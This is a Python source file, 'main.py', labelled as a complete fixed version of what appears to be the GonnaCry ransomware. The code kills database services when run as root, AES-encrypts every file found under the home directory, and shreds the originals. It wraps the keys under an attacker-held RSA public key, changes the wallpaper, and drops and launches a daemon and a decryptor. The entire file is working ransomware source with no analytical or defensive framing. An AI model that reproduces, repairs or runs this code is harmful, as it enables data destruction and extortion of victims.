# main.py (完整修复版)

import asymmetric
import get_files
import symmetric
import environment
import generate_keys
import utils
import variables

import os
import string
import random
import base64
import pickle
import gc
import subprocess

from Crypto.PublicKey import RSA
from Crypto.Hash import MD5
from Crypto.Hash import SHA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP


def kill_databases():
    if (os.getuid() == 0):
        mysql = 'mysqld stop; mysql.server stop'
        mongo = 'service mongodb stop; /etc/init.d/mongodb stop'
        postgres = 'pkill -u postgres; pkill postgres'

        os.system(mysql)
        os.system(mongo)
        os.system(postgres)


def encrypt_priv_key(msg, key):
    n = 127
    x = [msg[i:i + n] for i in range(0, len(msg), n)]

    key = RSA.import_key(key)  # 使用 import_key
    cipher = PKCS1_OAEP.new(key)
    encrypted = []
    for i in x:
        ciphertext = cipher.encrypt(i)
        encrypted.append(ciphertext)
    return encrypted


def start_encryption(files):
    AES_and_base64_path = []
    for b64_path_str in files:
        try:
            path_bytes = base64.b64decode(b64_path_str)
            file_path = path_bytes.decode('utf-8')

            if file_path.endswith(".GNNCRY") or "gonnacry" in file_path.lower():
                continue

            with open(file_path, 'rb') as f:
                file_content = f.read()  # bytes

            key = generate_keys.generate_key(128, True)
            AES_obj = symmetric.AESCipher(key)
            encrypted = AES_obj.encrypt(file_content)  # bytes

            utils.shred(file_path)

            enc_path = file_path + ".GNNCRY"
            with open(enc_path, 'wb') as f:
                f.write(encrypted)

            b64_enc_path = base64.b64encode(enc_path.encode('utf-8')).decode('utf-8')
            AES_and_base64_path.append((key, b64_enc_path))

        except Exception as e:
            print(f"[!] Failed to encrypt {b64_path_str}: {e}")
            continue
    return AES_and_base64_path


def menu():
    try:
        os.makedirs(variables.test_path, exist_ok=True)
    except OSError:
        pass

    kill_databases()

    files = get_files.find_files(variables.home)

    rsa_object = asymmetric.Asymmetric()
    rsa_object.generate_keys()

    Client_private_key = rsa_object.private_key_PEM
    Client_public_key = rsa_object.public_key_PEM
    encrypted_client_private_key = encrypt_priv_key(Client_private_key,
                                                    variables.server_public_key)

    with open(variables.encrypted_client_private_key_path, 'wb') as output:
        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)

    with open(variables.client_public_key_path, 'wb') as f:
        f.write(Client_public_key)

    Client_private_key = None
    rsa_object = None
    del rsa_object
    del Client_private_key
    gc.collect()

    client_public_key_object = RSA.import_key(Client_public_key)  # import_key
    client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)

    # FILE ENCRYPTION STARTS HERE !!!
    aes_keys_and_base64_path = start_encryption(files)
    enc_aes_key_and_base64_path = []

    for _ in aes_keys_and_base64_path:
        aes_key = _[0]
        base64_path = _[1]

        encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))

    aes_keys_and_base64_path = None
    del aes_keys_and_base64_path
    gc.collect()

    with open(variables.aes_encrypted_keys_path, 'w') as f:
        for _ in enc_aes_key_and_base64_path:
            line = base64.b64encode(_[0]).decode('utf-8') + " " + _[1] + "\n"
            f.write(line)

    enc_aes_key_and_base64_path = None
    del enc_aes_key_and_base64_path
    gc.collect()


def drop_daemon_and_decryptor():
    with open(variables.decryptor_path, 'wb') as f:
        f.write(base64.b64decode(variables.decryptor))

    with open(variables.daemon_path, 'wb') as f:
        f.write(base64.b64decode(variables.daemon))

    os.chdir(variables.ransomware_path)
    os.system('chmod +x daemon')
    os.system('chmod +x decryptor')
    utils.run_subprocess('./daemon')


if __name__ == "__main__":
    menu()
    utils.change_wallpaper()
    drop_daemon_and_decryptor()